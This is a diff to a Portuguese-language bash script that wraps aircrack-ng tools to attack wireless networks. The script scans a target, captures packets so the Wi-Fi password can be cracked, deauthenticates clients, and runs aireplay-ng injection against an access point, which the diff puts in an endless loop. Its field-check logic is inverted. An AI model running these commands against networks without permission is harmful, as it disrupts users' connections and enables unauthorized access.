@@ -106,10 +106,10 @@ function varrer_uma_rede() {
 setar_parametros
 
 # Verifica se os 4 parametros obrigatorios para uso da função estão setados.
-[ -z $BSSID  ] || echo "[ FALHA ] O campo obrigatorio BSSID esta vazio" 
-[ -z $ESSID ] || echo "[ FALHA ] O campo obrigatorio ESSID esta vazio" 
-[ -z $CHANNEL ] || echo "[ FALHA ] O campo obrigatorio Channel esta vazio" 
-[ -z $INTERFACE_MON ] || echo "[ FALHA ] O campo obrigatorio Monitor esta vazio" 
+[ -z $BSSID  ] || echo "[ FALHA ] O campo obrigatorio BSSID esta vazio"
+[ -z $ESSID ] || echo "[ FALHA ] O campo obrigatorio ESSID esta vazio"
+[ -z $CHANNEL ] || echo "[ FALHA ] O campo obrigatorio Channel esta vazio"
+[ -z $INTERFACE_MON ] || echo "[ FALHA ] O campo obrigatorio Monitor esta vazio"
 
 # Capture no minimo 5000 (5 mil) pacotes do tipo data frame (#Data) antes de tentar realizar a quebra da senha
 (xterm -geometry 85x25 -title "Escaneando rede a sem fio $ESSID" \
@@ -133,12 +133,18 @@ function deauth_cliente_especifico() {
 echo "[ FALHA ] Ocorreram erros em fazer o deuth da STA $CLIENT na rede $ESSID"
 
 }
+function deauth_brute_force() {
+echo
+}
 
 function injetar(){
-# Realizar testes de injecao contra um AP especifico
-(xterm -geometry 85x25 -title "Tentando realizar Injecaode pacotes no AP: $ESSID" \
--e "aireplay-ng -9 -a $BSSID -e $ESSID $INTERFACE_MON) || \
+while true; do
+# Realizar testes de injecao contra um AP
+(xterm -geometry 85x25 -title "Realizando Injecao de pacotes no AP: $ESSID" \
+-e "aireplay-ng -9 -a $BSSID -e $ESSID $INTERFACE_MON") || \
 echo "[ FALHA ] Nao foi possivel injetar pacotes no AP: $ESSID"
+
+done
 
 }
 
